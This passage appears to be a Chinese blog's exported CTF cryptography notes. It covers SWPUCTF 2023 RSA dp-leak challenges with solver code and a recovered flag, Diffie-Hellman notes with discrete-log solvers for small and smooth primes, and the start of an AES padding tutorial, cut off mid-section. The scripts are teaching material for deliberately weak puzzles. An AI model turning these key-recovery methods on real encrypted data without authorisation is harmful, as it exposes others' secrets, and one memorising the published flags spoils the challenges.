class="line">0x469ff6f3649b902be1e3b59aa68eee1b10a1056e109872b42c00a3d574ab13337e4b09d094e1a43b16d4c5ebd266266e2564cf3b630a3d3207b5aacfa7f50ab621034a7dfcd231ed3247e74093c4836bfefc6af53857ee09d242bcd346bcb9e6e1cfae3c38fcee9f3cc22fe51d7a9ac96f914a0f0985639c8aeafd254f0c6304398138c256c1c80e4969d7d3d4ce2e8885608bc2d8d83bf7a218aaae015341bbf7d873d54a4ec0afce0b6a7898df840b4b682276c394ca3a38e688b8aeea675ede5d28908a89d59c98321b3c14900d4a89249784a12066d385312ae307a8438c8e49b42b1d234546e46c1536ae0b5178abc609d9061b5a8711ae6c2a7140a23e</span><br><span class="line">0x1c39de925a76c7207714684fc339567cd439a106ee1b2c09232652f899f798c459629de9d4ba464666d1a050642964d446762b9be80bb417aa411ae81d30751acdda9d914581fb8715853aaa8869bcf6050c0a9f6a0060a888f3353298e5617f0c1807a711418ef91d7662864187c360c48a6988a7004e6a786a3071bebfb1198456f7fa5a2a651fa31cd8b0c1e9fbb515a37977dccfce79784617e83c760d6bba6e65cc566e96a01143c9ee7dfca95bae3a4af0f30eb579a0ad8a8be453bbcf147dc9c2a048d877621e507d208e6105929d5beb28bc86e58570b8e2d32927d7d7f65dc4ee929abb85a7cc73194ebb4f4ff84213f28dabfd81eaac5c8ad9ab5</span><br><span class="line">0x256996daa2c9dae14a986ff70f0f453b1b12bcbbce4232380e4145e141684fbbe91ab67c524159487ca26726690f8da588cc7af61801ab3065290bfa4d440b85803fc3b9d010d346c7b4f7f2b8f0b3253102f10e6812592bac933712b71baf0cf470d0b782894693dd256c2ead766c3c271fb45d65008316511710d22ea318cef51731c598314101846a7f9674fba6adbddffa16bb15ea03021c54038e46c7a4846f45211ba17e733577153a78a7ec1d463d07e7e7c1ac8cfe06625ff3aac27d2f651ef04618ec6107652b0627528748640b0c9e7a446e5cdece79080b0009eab5ba41e0db367049ce69687ba2cae8481761b87fd0e6a7ba5e84ac55a5231d0f</span><br><span class="line"></span><br><span class="line">0x5a045180ce4cbcdb8d4f48ae4fafb4dab8b3a1a829afd15f3aa5afa90c03aca9eb6b1dec208594580fba45b8af15cf7ac60031cb9c28e402a0a563fcf9feeed7c05de10104560fb1e66463be3573fc98d7b4178fb1d9c99af7cbc4da65fbb40b5fe26bd78bb83e94236136e0ab86f9228963b90d926abb8002f9e6a8ad695a826c12454e6bf6d44624188d8454e4afa133ed9cffcf504239bc2df4eddb0910f47047858da710dd1ef7b96b2430b69fc78b3a8e4d19657b4fb2fbcbac656e851d86fee14f487a4e4fcca93fef24eb9e3f72ee3aebe0aa27e14a2889c13410a22a4ff99802729a1e802b1e343abe51f99f9b131e6e932ef6336cb2539befc7ad2b</span><br><span class="line">0x2ca6110b03ecad45d9f8969c6a47e4e434708288bb35738f4e1974647ae4ac5782377117bf96a25936c5f049ce5fb89aeb9022c99f1eb2085f0a2e9e06f5bdd7c512dea7fa839ae55eb78d95f8ed9a34e35fe901cd499efe116142976e6170c85987cb1355ddf1d7cf6e66120a355ae02cce4ccef86ae27860f55c61249cf5b6daf728c570bfeb8f03f6dfab1cf168ab16e7e1efe1582f9717d449984184c604ec5af6070837b1350dfaf188b6bb76ad81f5c70804fa7a79d2c1c5f8de9b5cb9ed859bf75f912c445fed04252edfa590e2354b72d08331ab631b9d59835435e6c0e80e418ba6c2e1655ca7ef19555b792f768c2d07bc7deabfc8c06a9061d987</span><br><span class="line">0x148dce72b5b82bcc8bda6d5d2aa0ef4c665b647edb4e588058519c9b4fd3c25fc24f73569bdf14491d5a6ecc01aa6ee797711e612b7e271f2f551407b7f73c2b5fe9bba6168777bd82a4ef3c5ac46bdb339a43ccdea2ca913141eb909ae7e03cba79331556f3111679878748819175f921a114c57c001d22fe4ef26bed7c56725fd982d4fa356b2e25e962a88471feef63e82c9640b0293b98e1971ab78111e76fd485dc6c53ec656266759c2c9b4a2465ad1618fa7d89454161b1d799c90af1d055d9749a49c8aa9a1d956683841c234641e0ca30d97865355da3c5879db378ef9c44e78320c4f97ae50c385cb1e4877c2ec2c1fa64915625654ba0c8c01efa</span><br><span class="line">0x4449cb7346cd8bc4c4fc0e0c492cc40a1b4f1a3f93815eb19353fb82a3c34cfdfe91bc01a80f779998185a6a36cf68094641367fd912f146d9ec793bf88d2fea7f793375ea4d79e95c8c18e8dc83e0d7590fe007862024e82786e11754ecb4b93c19c01550631196fcaa34b73646125b1baa8fd8726d99f9752abad9a5e2136e0a909700a0423fbd97865b87790c6e16b85a51aa7dd987e84cc7a8f4617a0de31f4d1c538587a8fd8b91b50f8551c306c3240339c8d89f9a6842f65f59db0ac935640f998e705ec6dad8b5403e786bcbc901b9cdaa671fe5d05707d637772199779bce17e7942eb185aa86ce668863261f85539696b5a5835826f67cd25acd49</span><br><span class="line">0x2197e3bc7c4bc600dac76f2b4dce190bba84f5a2df71e086efa5d9e1891d93ef7a722a8912c65c71a39fd495da83078ba4ecfae537e7cce6ca4cc2621e6f019fc10a322fffc66d4a2f9d0674c300df5c5cb290d8ad0228b5a22d86a4e99c171ce2d29f0ad52fa07b17fb6accfba6e78af4c3c1f5f578c7b496df797cc38b9c8a61b6b1fdc5648291753283d6dc3dc11e10ad5513bbb4b579a0b1c07c92fdb59df8a4f036e050e4d4668586f16685810f2e8cf62763d1d17fc493ad04ded7fd64e09b8299eeb5aa51b2e4287bec9b042285e49e04adfee80235eea001b3443976e460dd87710343c503129924e8cbb5b71849f3cb07fe9d7956c688e7521cbbae</span><br><span class="line">0x224fda6f7940f6a120d586691428da3a93baec1d4be63ddad058b00a78d311a111aaf3174d6ab8bffb5403c8b721cd64d5440da5607d7d8729ee732fd86e2407c2fdc8ad3bba763e856c2a517cafeae8465952ff0854d712fdbb410f924e5bac561411beaaddf5c02536f273704a14b5de13c51cba3dc029bd2c7250f972b1679e1f21acdc27cda6c33b72a4258f68d00395e82c2f0d92c153ad5240b26ef581e0b5ba78c0c9409a5fb02f4d49707e9b941e0ad37e22ef9c42a568a10b000e91059650b620fd69552c4d267ed1b479378e60870cfd2026d248d32b9600f3b8ba2c7d05c6872847e43760d51d3b69e85449d21a3eb5eeef82d450a803b4500b79</span><br><span class="line">0x32b9ecdea94109ebb2fac3a1bbc8605a2e7f3622a2559e1e0811921881b736de43771ba97d0c071ea05caa613c84f4f3b8f553f2ca2eccc1c3c8708ded528a7fc34881530a95d95dae4bdd27967f0b8b706530725d62447d732615825aadd901fa86675431e245aa1c3937d5f4d76f06a52caa8ca2100a9568c1817f14c6e6bb01f7d4543bd0d985ad2e1ee4310db1eafa37ae90b38582ef6212552e8bf6c6cbd483ae580a65b4171dd6bb767b3ae50d6a0f8bc9d45ca7d2ec12bea582b7aa39c3df3e20c2de9851456f111719b4ea6fe2d9c3ada0787ec83e4a7e5a2348b58526d4d267db693e508599f9cd31729a36d510aec40c756974a6f1e825fbcfc1d1</span><br><span class="line">0x1ceec14e3fea63e688f500df76526d391cb411aba993a7407671e234698441e4c3c80efdf0092f0f7af0e14cedde5efe144ee8db2b5a0e7f8f300ca49f81dd189a83527f0c846ac1cbed4ba909f8df04efdeacaa616c005a609f43cdafac49ce49b482a5e244e1cd96fb4643066887d8d858314e816dd08df711b46fded216c4b8bee5a24379522e73a84e53ae0d778e47e7c5e96869a1666d90abea5638719932baf857745e50d3f32933d62d9bbffdc8d6b1ca6232e2bca8533afdd5b4175ed61db1e604d9645594b3dcf89e0550175bbb6d3de99598c665911c26e824f36b277681cfa802989c8b010d2143fe94ebef8dee4da4e5a4f097fb3a22b1242c52</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="SWPUCTF-2023-秋季新生赛-dpdp-【dp泄露】"><a href="#SWPUCTF-2023-秋季新生赛-dpdp-【dp泄露】" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]dpdp 【dp泄露】"></a>[SWPUCTF 2023 秋季新生赛]dpdp 【dp泄露】</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span> + <span class="string">b&#x27;1010101010101010101010101010101010101010100010101010101010101010101101&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line">m = s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;dp = <span class="subst">&#123;dp&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">62950660589752377241535942010457460675378335694404721223426371627802159493655570041534480026979837056215567303530448462076388942749116962945931432723672826148999814815864738069663127706046027850586024555861960247057288826014343547293035737544457656904257388300461848219257240252715837662741274235378360898441</span></span><br><span class="line">c = <span class="number">26392919777656338278184497106215581599692023606797351841011065350738534402079717897589592521000832026751736045905247050532819571969784687491977953157313304550096179520376626220816081159472339787295872214912587497324709488986746768994907107727184468228540635002062232484115731701648311946527233449512543132274</span></span><br><span class="line">dp = <span class="number">7088497034630351463006975624795947102639056977565074157092915907376477955247769847204254053775159112398217033648894620506901638351932922911273150932128973</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dp泄露 可用下面这个板子</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">62950660589752377241535942010457460675378335694404721223426371627802159493655570041534480026979837056215567303530448462076388942749116962945931432723672826148999814815864738069663127706046027850586024555861960247057288826014343547293035737544457656904257388300461848219257240252715837662741274235378360898441</span></span><br><span class="line">c = <span class="number">26392919777656338278184497106215581599692023606797351841011065350738534402079717897589592521000832026751736045905247050532819571969784687491977953157313304550096179520376626220816081159472339787295872214912587497324709488986746768994907107727184468228540635002062232484115731701648311946527233449512543132274</span></span><br><span class="line">dp = <span class="number">7088497034630351463006975624795947102639056977565074157092915907376477955247769847204254053775159112398217033648894620506901638351932922911273150932128973</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):  <span class="comment"># 在范围(1,e)之间进行遍历</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># 存在p，使得n能被p整除</span></span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)  <span class="comment"># 欧拉定理</span></span><br><span class="line">            d = gmpy2.invert(e, phi)  <span class="comment"># 求模逆</span></span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># 快速求幂取模运算</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;CTFCTFNSSNSS&#125;1010101010101010101010101010101010101010100010101010101010101010101101&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2023-秋季新生赛-dpdpdpdp-还没做"><a href="#SWPUCTF-2023-秋季新生赛-dpdpdpdp-还没做" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]dpdpdpdp [还没做]"></a>[SWPUCTF 2023 秋季新生赛]dpdpdpdp [还没做]</h2><p>和上面题相比 e变得很大 所以无法用之前遍历的方式</p>
<p>可以使用维纳攻击</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;dp = <span class="subst">&#123;dp&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">92288362151232755164303382554034496430634785857894506752180261103500715219090974532177552845107426542175470207920267802066773828210866572070045093611090322738109527534622730588618668861998969946471756352024368486322527057077613762697792913167023012077178671066981439295386486943067698150993422039585259179729</span></span><br><span class="line">e = <span class="number">229991316986730339421575788374847647237</span></span><br><span class="line">c = <span class="number">66178170892880340054212366602556925884485962775832591797127163461420023986798822926684824340567060840259672460835004142425374706821346941926520921852009455818529825976414766339170445233789109526300838535719649346266975388774091834431039678689254534566870194580604694419819400454951059125553501095973278807456</span></span><br><span class="line">dp = <span class="number">8987556601717285362487353965045062789633142861774364363374961991445049127918653163458814169532860957264061203394944931114888144611267605606197232438332289</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Diffie-Hellman算法</title>
    <url>/posts/b9d99e81/</url>
    <content><![CDATA[<p>参考文章：</p>
<p><a href="https://fishni.github.io/2021/03/16/Crypto-02-Diffie-Hellman%EF%BC%88DH%EF%BC%89%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2/">https://fishni.github.io/2021/03/16/Crypto-02-Diffie-Hellman%EF%BC%88DH%EF%BC%89%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2/</a></p>
<h3 id="Diffie-Hellman算法"><a href="#Diffie-Hellman算法" class="headerlink" title="Diffie-Hellman算法"></a>Diffie-Hellman算法</h3><p>秘钥交换算法 是一种建立秘钥的方法，而不是加密方法，所以一般需要结合其他一种加密算法使用</p>
<p>幂模运算</p>
<p>整数b(底数)的e次方(指数) 除以正整数m(模) 所得的余数c 称为幂模</p>
<p><img src="/posts/b9d99e81/1.png"></p>
<h4 id="DHKE协议的过程"><a href="#DHKE协议的过程" class="headerlink" title="DHKE协议的过程"></a>DHKE协议的过程</h4><p>下面两个图相对很好理解</p>
<p><img src="/posts/b9d99e81/2.png"></p>
<p><img src="/posts/b9d99e81/3.png"></p>
<p>原根： <a href="https://blog.csdn.net/dreamzuora/article/details/52744471">https://blog.csdn.net/dreamzuora/article/details/52744471</a></p>
<blockquote>
<p>假设一个数 g 是P的原根，那么 g^i mod P 的结果两个不同，且有 g∈(1,P) i∈(1,P) 那么g可以称为P的一个原根</p>
<p>即 g^i mod p ≠ g^j mod p (p为素数) 且 i≠j i,j∈(1,p-1) 则g为p的原根</p>
</blockquote>
<p>光滑数：可约数分解为小素数乘积的正整数</p>
<p>一般来说 素数600位以上时，很难被破解。当素数较小时，存在暴力破解的风险</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>My buddies Whitfield and Martin were trying to share a secret key between  themselves, and I was able to eavesdrop on their conversation. I bet I  could probably figure out their shared secret with a little math…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 69691</span><br><span class="line">g = 1001</span><br><span class="line">A = 17016</span><br><span class="line">B = 47643</span><br></pre></td></tr></table></figure>

<p>Note: submit either the shared secret or the shared secret wrapped in utflag{}</p>
<p>g^i mod p = A -&gt; i (b)</p>
<p>g^i mod p = B -&gt; i （a)</p>
<p>分别算出 A B的私钥i i取值在 1~p</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">K = B^a mod p = A ^ b mod p</span><br><span class="line"> </span><br><span class="line"><span class="built_in">pow</span>(B,a,p) <span class="built_in">pow</span>(A,b,p)</span><br><span class="line"> </span><br><span class="line">p=<span class="number">69691</span></span><br><span class="line">g=<span class="number">1001</span></span><br><span class="line">A=<span class="number">17016</span></span><br><span class="line">B=<span class="number">47643</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># g^i mod p  = A   -&gt; i</span></span><br><span class="line"><span class="comment"># g^i mod p = B   -&gt; i</span></span><br><span class="line"><span class="comment"># 分别算出 A B的私钥i    i取值在 1~p</span></span><br><span class="line"><span class="comment"># K = B^a mod p = A ^ b mod p</span></span><br><span class="line"><span class="comment"># K = pow(B,a,p)    K = pow(A,b,p)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g,i,p) == A :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a:&quot;</span>,i,<span class="string">&quot;\t K=&quot;</span>,<span class="built_in">pow</span>(B,i,p))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g,i,p) == B:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;b:&quot;</span>,i,<span class="string">&quot;\t K=&quot;</span>,<span class="built_in">pow</span>(A,i,p))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">         </span><br><span class="line"><span class="comment"># a: 12552   K= 53919</span></span><br><span class="line"><span class="comment"># b: 7919    K= 53919</span></span><br></pre></td></tr></table></figure>

<h4 id="flag-exchange-【-这个还是不太懂-后面学明白了再回来看】"><a href="#flag-exchange-【-这个还是不太懂-后面学明白了再回来看】" class="headerlink" title="flag_exchange 【 这个还是不太懂 后面学明白了再回来看】"></a>flag_exchange 【 这个还是不太懂 后面学明白了再回来看】</h4><p>看完这道例题 就稍微有点印象了 当然不是完全懂 再看下对应的题目</p>
<p>之前的moectf flag_exchange 也是使用该加密算法<code>         </code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diffie_hellman</span>(<span class="params">p, flag</span>):</span><br><span class="line">    alice_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    alice_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, alice_privKey, p)</span><br><span class="line">    bob_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    bob_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, bob_privKey, p)</span><br><span class="line">    <span class="comment"># aK =  7^ak mod p</span></span><br><span class="line">    <span class="comment"># bK =  7^bk mod p</span></span><br><span class="line">  </span><br><span class="line">    superkey = <span class="built_in">pow</span>(bob_pubKey, alice_privKey, p)</span><br><span class="line">    <span class="comment"># K = bK ^ ak mod p</span></span><br><span class="line">    m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> (m * superkey) % p, alice_pubKey, bob_pubKey</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># m*SK mod p    aK     bK</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params"><span class="built_in">input</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>], <span class="built_in">print</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>]</span>):</span><br><span class="line">    p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;P = &quot;</span>))</span><br><span class="line">    <span class="comment"># 大素数p</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> p.bit_length() &gt;= <span class="number">1024</span>:</span><br><span class="line">        c, alice_pubKey, bob_pubKey = diffie_hellman(p, flag)</span><br><span class="line">        <span class="comment">#  c = m*SK mod p  =&gt;  m = c*Sk^-1 mod p</span></span><br><span class="line">         </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alice&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(alice_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bob&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(bob_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Ciphertext: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid P&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>生成一个光滑素数p</p>
<p>g = 7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B = 7 ^ b mod p</span><br><span class="line">A = 7 ^ a mod p </span><br><span class="line">这里的 A B 是由自定义a  b 计算而来</span><br><span class="line"></span><br><span class="line">随后可得superkey </span><br><span class="line">SK = B^a mod p </span><br><span class="line">算出superkey </span><br><span class="line">#  c = m*SK mod p  =&gt;  m = c*SK^-1 mod p</span><br><span class="line">m即flag</span><br></pre></td></tr></table></figure>

<p>WP 有点看不懂 感觉A B c是自己定义生成的 如果是自己生产的话 那就比较好理解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造一个很光滑的p，即p可以分解成许多小素数之积</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> isPrime(p+<span class="number">1</span>) ==<span class="literal">False</span> <span class="keyword">or</span> p.bit_length()&lt;<span class="number">1024</span> :</span><br><span class="line">    p *= i</span><br><span class="line">    i = gmpy2.next_prime(i)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#print(p+1) 取p+1为对应素数p</span></span><br><span class="line"><span class="comment"># A B c ??? 感觉像是自己构造生成的</span></span><br><span class="line"> </span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">p = <span class="number">20404068993016374194542464172774607695659797117423121913227131032339026169175929902244453757410468728842929862271605567818821685490676661985389839958622802465986881376139404138376153096103140834665563646740160279755212317501356863003638612390661668406235422311783742390510526587257026500302696834793248526734305801634165948702506367176701233298064616663553716975429048751575597150417381063934255689124486029492908966644747931</span></span><br><span class="line">A = <span class="number">20336091449271352050000450320351597189353592062279377142884247684088072216754371140723688503847322269500056016823378486967669507529408071986247421480538070427020298314420596325895121922786822444746298488308935254197730980462214370281102952073051791017954008911348128021296665124600273965642418702110947948173149809724203543773244607616601110670126605337319276524135448598308833199821995622969372761107826550795621362415457182</span></span><br><span class="line">B = <span class="number">3016038452071464751422492594184606815201979377859418872430468328543181786920301668755954977729921559697635702877324759319811639923934643618711315555467453055288843246623654939387741368313873206560664229687375070952935800932126812264287402142801364732994539469801252414404987968911552061069354407508916590343552775560281691608737262245571829068155383159065889848197300894149747651679644288337413872066182471443965426404626423</span></span><br><span class="line">c = <span class="number">8101058129734054038632640353434785588447342802920921913999474154497466343094694993166042668700504613189281291125022077749043805204765309971981658929422844998392130190493145455241084775180221325627765838099393607299071835294706132501949635214088146102721237571159346281928107966372652823580266088579392328383545323322931789769149936581855383571990955947284354676448353798975087410774586309247023597516943906734455833918792577</span></span><br><span class="line"> </span><br><span class="line">a = discrete_log(mod(A,p),mod(g,p))</span><br><span class="line"> </span><br><span class="line">b = discrete_log(mod(B,p),mod(g,p))</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"> </span><br><span class="line">superkey = <span class="built_in">pow</span>(B, a, p)</span><br><span class="line"> </span><br><span class="line">p = gmpy2.mpz(p)</span><br><span class="line">superkey = gmpy2.mpz(superkey)</span><br><span class="line"> </span><br><span class="line">d = gmpy2.invert(superkey,p) % p</span><br><span class="line">m = c*d % p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF密码学之AES加密</title>
    <url>/posts/b568ee4f/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>AES加密算法是密码学中的高级加密标准，属于对称、分组加密算法，在CTF现代密码学中作为一个比较常考的题目，本篇会对AES加密算法做较为详细的讲解，并对一些AES题型进行分析总结。</p>
<h3 id="AES基础"><a href="#AES基础" class="headerlink" title="AES基础"></a>AES基础</h3><p>AES算法，是DES算法的替代者，属于当今最为流行的对称加密算法之一。 要想具体了解学习AES算法，首先要清楚三个基本概念：<strong>密钥、填充、模式</strong>。</p>
<h4 id="密钥"><a href="#密钥" class="headerlink" title="密钥"></a>密钥</h4><p>密钥是AES算法实现加密和解密的根本。AES支持3种长度的密码  128位、192位、256位。</p>
<p>从安全性来看，AES256安全性最高。从性能来看，AES128性能最高。其本质原因是他们的加密处理轮数不同。</p>
<p>AES的加密标准中，每个分组的 长度固定为128bits(16Bytes)，密钥长度为128bits，192bits，256bits,不同的密钥长度有不同的加密轮数,根据长度不同可以分为AES-128，AES-192，AES-256。</p>
<table>
<thead>
<tr>
<th>AES加密</th>
<th>密钥长度</th>
<th>分组长度</th>
<th>加密轮数</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>128bits</td>
<td>128bits</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>192bits</td>
<td>128bits</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>256bits</td>
<td>128bits</td>
<td>14</td>
</tr>
</tbody></table>
<h4 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h4><p>在AES加密中 有六种填充模式，分别为 <strong>NoPadding, PKCS#5, PKCS#7, ISO 10126, ANSI X9.23和ZerosPadding</strong> 。</p>
<ul>
<li>Nopadding ：不进行填充</li>
<li>ZerosPadding：缺少的字节全部使用 0x00填充</li>
<li>PKCS#5 &amp; PKCS#7：缺少几个字节就填充几个字节，值为填充的字符数</li>
</ul>
<blockquote>
<p>例如,AAAAAAAA  BBBBBBBB CCCCCCCC    刚好分成3个分组       </p>
<pre><code>     AAAAAAAA  BBBBBBBB CCCCC\____    缺少3个字节 所以使用 0x03进行填充      
</code></pre>
<p> (这里例子的A B C 均视为一个字节 以pkcs5为例 8个字节为一组)</p>
<p>如果明文块小于16个字节(128bit) 那么在明文块末尾补足响应数量的字符，且每个字符的值为填充字符数（缺少的字符数）</p>
<p>比如明文按照16个字节为一组的话：{1,2,3,4,5,a,b,c,d,e}，缺少6个字节【128/8-10=6】，则补全为{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6}</p>
<p>【不同在于 PKCS5 限定了块大小为 8bytes，而PKCS7没有限定，在AES加密当中严格来说是不能使用pkcs5的，因为AES的块大小是 <strong>16bytes</strong>，而 pkcs5 只能用于 <strong>8bytes</strong>，通常我们在AES加密中所说的 pkcs5 指的就是 pkcs7】</p>
</blockquote>
<ul>
<li>ISO 10126：最后一个字节是填充的字节数（包括最后一字节），其他全部填随机数</li>
</ul>
<blockquote>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 | … </p>
</blockquote>
<ul>
<li>ANSI X9.23：和ISO 10126相似，最后一个字节是填充的字节数，区别在 这种方法填充的其他字节都是0，而不是随机数</li>
</ul>
<blockquote>
